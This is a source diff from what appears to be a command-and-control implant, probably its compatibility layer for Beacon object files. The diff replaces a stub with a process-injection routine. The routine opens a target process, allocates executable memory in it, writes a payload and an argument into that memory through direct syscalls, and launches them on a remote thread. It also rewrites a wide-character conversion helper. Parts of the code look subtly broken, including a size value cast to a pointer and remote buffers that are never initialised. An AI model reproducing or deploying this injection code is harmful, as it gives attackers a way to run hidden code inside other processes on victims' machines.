@@ -364,7 +364,7 @@ BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo
         Size = Len * sizeof(WCHAR);
         wPath = Instance->Win32.LocalAlloc(LPTR, Size);
 
-        if (toWideChar(Path, wPath, Size) <= 0) {
+        if (!toWideChar(Path, wPath, Size)) {
             return FALSE;
         }
 
@@ -376,12 +376,48 @@ BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo
 
 VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char * arg, int a_len )
 {
-    // TODO: handle this
+    PVOID p_RemoteBuf;
+    PVOID a_RemoteBuf;
+    SIZE_T Size;
+    NTSTATUS Status;
+
+    if (hProc == NULL) {
+        hProc = Instance->Syscall.NtOpenProcess(PROCESS_ALL_ACCESS, FALSE, NULL, pid);
+        if (hProc == INVALID_HANDLE_VALUE) {
+            return;
+        }
+    }
+
+    // allocate memory space for payload
+    Size = p_len * sizeof(char);
+    Status = Instance->Syscall.NtAllocateVirtualMemory(hProc, &p_RemoteBuf, 0, (PULONG)Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    if (Status != STATUS_SUCCESS) {
+        return;
+    }
+
+    Status = Instance->Syscall.NtWriteVirtualMemory(hProc, p_RemoteBuf, (PVOID)payload, Size, 0);
+    if (Status != STATUS_SUCCESS) {
+        return;
+    }
+
+    // allocate memory space for argument
+    Size = a_len * sizeof(char);
+    Status = Instance->Syscall.NtAllocateVirtualMemory(hProc, &a_RemoteBuf, 0, (PULONG)Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    if (Status != STATUS_SUCCESS) {
+        return;
+    }
+
+    Status = Instance->Syscall.NtWriteVirtualMemory(hProc, a_RemoteBuf, (PVOID)arg, Size, 0);
+    if (Status != STATUS_SUCCESS) {
+        return;
+    }
+
+    Instance->Syscall.NtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, NULL, NULL, NULL, NULL);
 }
 
 VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len )
 {
-    // TODO: handle this
+    
 }
 
 VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
@@ -399,7 +435,12 @@ VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
 
 BOOL toWideChar( char* src, wchar_t* dst, int max )
 {
-    if (max < sizeof(wchar_t))
+    SIZE_T Length = 0;
+
+    Length = CharStringToWCharString(dst, src, max);
+    if (Length == 0) {
         return FALSE;
-    return MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, src, -1, dst, max / sizeof(wchar_t));
+    }
+
+    return TRUE;
 }
